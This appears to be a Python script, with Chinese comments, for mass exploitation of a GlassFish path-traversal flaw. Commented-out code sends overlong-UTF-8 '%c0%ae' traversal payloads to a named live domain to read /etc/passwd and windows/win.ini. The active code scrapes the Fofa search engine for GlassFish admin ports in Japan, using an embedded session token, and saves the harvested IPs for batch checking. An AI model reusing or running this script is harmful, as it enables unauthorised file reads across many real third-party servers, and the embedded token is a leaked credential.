import requests
import base64
from lxml import etree
import time

# url='http://daishen.ltd'
# payload_linux='/theme/META-INF/%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/etc/passwd'
# payload_windows='/theme/META-INF/%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/windows/win.ini'
# data_linux=requests.get(url+payload_linux).status_code
# data_windows=requests.get(url+payload_windows).status_code
# # print(data_linux.content.decode('utf-8'))
# # print(data_windows.content.decode('utf-8'))
# print(data_windows)
# print(data_linux)
# if data_linux ==200 or data_windows == 200:
#     print('存在漏洞')
# else:
#     print('不存在漏洞')

# 如何实现这个漏洞批量化:
# 1.获取到可能存在漏洞的地址信息借助Fofa进行获取目标
# 2.批量请求地址信息进行判断是否存在

search_data='"glassfish" && port="4848" && country="JP"'
headers={
    'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/94.0.4606.71 Safari/537.36 Edg/94.0.992.38',
    'cookie': 'fofa_token=eyJhbGciOiJIUzUxMiIsImtpZCI6Ik5XWTVZakF4TVRkalltSTJNRFZsWXpRM05EWXdaakF3TURVMlkyWTNZemd3TUdRd1pUTmpZUT09IiwidHlwIjoiSldUIn0.eyJpZCI6MTI4MDA4LCJtaWQiOjEwMDA3NjE2NywidXNlcm5hbWUiOiJIQUlSVUlfSCIsImV4cCI6MTYzMzU0Mzg2NH0.hpqMkzqxUwII7aed34k29RbiBU89kK9BL9EvUMPSdD4VT4Ab2nx9vWTq2ilooSlY0LXhY7d6Z1OC8ZjE5ArP6A;'
}
for page in range(1,6):
    url='https://fofa.so/result?&qbase64='
    search_data_base64=str(base64.b64encode(search_data.encode('utf-8')),'utf-8')
    # print(search_data_base64)
    urls=url+search_data_base64+'&page='+str(page)+'&page_size=10'
    try:
        print(urls)
        result=requests.get(urls,headers=headers).content.decode('utf-8')
        # print(result)
        soup=etree.HTML(result)
        # ip_data=soup.xpath('/html/body/div/div/div/div/div/div/div/div/div/div/div/span/a/@href')
        ip_data=soup.xpath('//*[@id="__layout"]/div/div/div/div/div/div/div/div/div/span/a/@href')
        print(ip_data)
        ipdata='\n'.join(ip_data)
        with open(r'ip.txt','a+') as f:
            f.write(ipdata+'\n')
            f.close
    except Exception as e:
        pass
    time.sleep(2)